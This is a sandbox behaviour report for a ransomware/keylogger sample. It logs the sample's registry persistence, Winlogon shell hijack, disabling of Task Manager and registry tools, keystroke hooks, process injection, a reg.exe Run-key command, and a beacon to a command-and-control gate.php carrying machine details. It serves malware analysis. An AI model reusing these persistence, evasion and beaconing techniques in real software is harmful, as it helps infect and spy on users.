@@ -1,0 +1,73 @@
+
+ Report generated with Buster Sandbox Analyzer 1.91 at 15:57:16 on 14/11/2021
+
+ [ General information ]
+   * Analysis duration: 00:00:30
+   * File name: D:\Ransom\VirusShare_f11784f620f9f42d9dfadf5e8ed8608e.EXE
+
+ [ Changes to filesystem ]
+   * Creates hidden folder C:\Users\samod\AppData\Local\Temp
+   * Creates file (empty) C:\Users\samod\AppData\Local\Temp\10746000.bat
+   * Creates hidden folder C:\Users\samod\AppData\Roaming
+   * Creates file (empty) C:\Users\samod\AppData\Roaming\ActiveX32_64lo.exe
+   * Creates hidden folder C:\Users\samod\AppData\Roaming\hs6u6j
+   * Creates file (empty) C:\Users\samod\AppData\Roaming\hs6u6j\dwlGina3.dll
+   * Creates file (empty) C:\Users\samod\AppData\Roaming\hs6u6j\sr4ur4u656.exe
+
+ [ Changes to registry ]
+   * Creates value "DontShowUI=00000001" in key HKEY_LOCAL_MACHINE\software\microsoft\Windows\Windows Error Reporting
+   * Creates Registry key HKEY_LOCAL_MACHINE\software\microsoft\Windows\Windows Error Reporting\LocalDumps
+   * Creates value "olmwKSKlNdgCU6b="C:\Users\samod\AppData\Roaming\ActiveX32_64lo.exe" /ActiveX" in key HKEY_LOCAL_MACHINE\software\WOW6432Node\Microsoft\Active Setup\Installed Components\{JJhOKXSl-ZUWD-ubpK-1idX-wzG4eyU41q1K}
+   * Creates value "olmwKSKlNdgCU6b=C:\Users\samod\AppData\Roaming\ActiveX32_64lo.exe" in key HKEY_LOCAL_MACHINE\software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
+   * Modifies value "Shell=C:\Users\samod\AppData\Roaming\ActiveX32_64lo.exe" in key HKEY_LOCAL_MACHINE\software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon
+          old value "Shell=explorer.exe"
+   * Creates Registry key HKEY_CURRENT_USER\software\Microsoft\Visual Basic\6.0
+   * Modifies value "HideIcons=00000001" in key HKEY_CURRENT_USER\software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
+          old value empty
+   * Modifies value "NukeOnDelete=00000001" in key HKEY_CURRENT_USER\software\Microsoft\Windows\CurrentVersion\Explorer\BitBucket\Volume\{0c5d2a95-0000-0000-0080-000000000000}
+          old value empty
+   * Modifies value "NukeOnDelete=00000001" in key HKEY_CURRENT_USER\software\Microsoft\Windows\CurrentVersion\Explorer\BitBucket\Volume\{6da28fdf-b9f2-4900-8b93-8571e38a4334}
+          old value empty
+   * Modifies value "1400=0" in key HKEY_CURRENT_USER\software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0
+          old value empty
+   * Modifies value "1400=0" in key HKEY_CURRENT_USER\software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1
+          old value empty
+   * Modifies value "1400=0" in key HKEY_CURRENT_USER\software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3
+          old value empty
+   * Creates value "NoDesktop=00000001" in key HKEY_CURRENT_USER\software\Microsoft\Windows\CurrentVersion\Policies\Explorer
+   * Creates value "DisableTaskMgr=1" in key HKEY_CURRENT_USER\software\Microsoft\Windows\CurrentVersion\Policies\System
+   * Creates value "DisableRegistryTools=00000001" in key HKEY_CURRENT_USER\software\Microsoft\Windows\CurrentVersion\Policies\System
+   * Creates value "srt6jursjy6=C:\Users\samod\AppData\Roaming\hs6u6j\sr4ur4u656.exe" in key HKEY_CURRENT_USER\software\Microsoft\Windows\CurrentVersion\Run
+   * Creates value "olmwKSKlNdgCU6b=C:\Users\samod\AppData\Roaming\ActiveX32_64lo.exe" in key HKEY_CURRENT_USER\software\Microsoft\Windows\CurrentVersion\Run
+   * Creates value "Shell=C:\Users\samod\AppData\Roaming\ActiveX32_64lo.exe" in key HKEY_CURRENT_USER\software\Microsoft\Windows NT\CurrentVersion\Winlogon
+   * Creates value "(Default)=31" in key HKEY_CURRENT_USER\software\SandboxAutoExec
+   * Creates value "VirusShare_f11784f620f9f42d9dfadf5e8ed8608e.EXE.FriendlyAppName=trotti levare" in key HKEY_CURRENT_USER\software\classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache\D:\Ransom
+   * Creates value "VirusShare_f11784f620f9f42d9dfadf5e8ed8608e.EXE.ApplicationCompany=offri amerei intesi resti teste papero esenti salpo vietai udii resine nature tenti re finite dorma api equi inerti orna rapata agio" in key HKEY_CURRENT_USER\software\classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache\D:\Ransom
+   * Creates value "sr4ur4u656.exe.FriendlyAppName=trotti levare" in key HKEY_CURRENT_USER\software\classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache\C:\Sandbox\samod\DefaultBox\user\current\AppData\Roaming\hs6u6j
+   * Creates value "sr4ur4u656.exe.ApplicationCompany=offri amerei intesi resti teste papero esenti salpo vietai udii resine nature tenti re finite dorma api equi inerti orna rapata agio" in key HKEY_CURRENT_USER\software\classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache\C:\Sandbox\samod\DefaultBox\user\current\AppData\Roaming\hs6u6j
+
+ [ Network services ]
+   * Looks for an Internet connection.
+   * Connects to "www.fuehlediebezahlung.com" on port 80.
+   * Opens next URLs:
+     http://www.fuehlediecon.com/wasgehtalter_panel/gate.php?hwid=691638565&pc=DESKTOP-19UU2F5&localip=192.168.0.105&winver=Unbekannte Windows-Version Home Edition x64
+
+ [ Process/window/string information ]
+   * Keylogger functionality.
+   * Gets system default language ID.
+   * Gets input locale identifiers.
+   * Gets computer name.
+   * Installs a hook procedure that monitors mouse messages.
+   * Installs a hook procedure that monitors keystroke messages.
+   * Deletes activity traces.
+   * Creates process "null, "C:\Users\samod\AppData\Local\Temp\10746000.bat" , D:\Ransom".
+   * Injects code into process "C:\Windows\SysWOW64\cmd.exe".
+   * Opens a service named "PcaSvc".
+   * Starts a service.
+   * Creates process "C:\WINDOWS\system32\reg.exe, REG  ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "srt6jursjy6" /t REG_SZ /d "C:\Users\samod\AppData\Roaming\hs6u6j\sr4ur4u656.exe" /f, D:\Ransom".
+   * Injects code into process "C:\Windows\SysWOW64\reg.exe".
+   * Creates process "C:\Users\samod\AppData\Roaming\hs6u6j\sr4ur4u656.exe, "C:\Users\samod\AppData\Roaming\hs6u6j\sr4ur4u656.exe" , D:\Ransom".
+   * Injects code into process "C:\Users\samod\AppData\Roaming\hs6u6j\sr4ur4u656.exe".
+   * Opens a service named "WinHttpAutoProxySvc".
+   * Enumerates running processes.
+   * Sleeps 20 seconds.
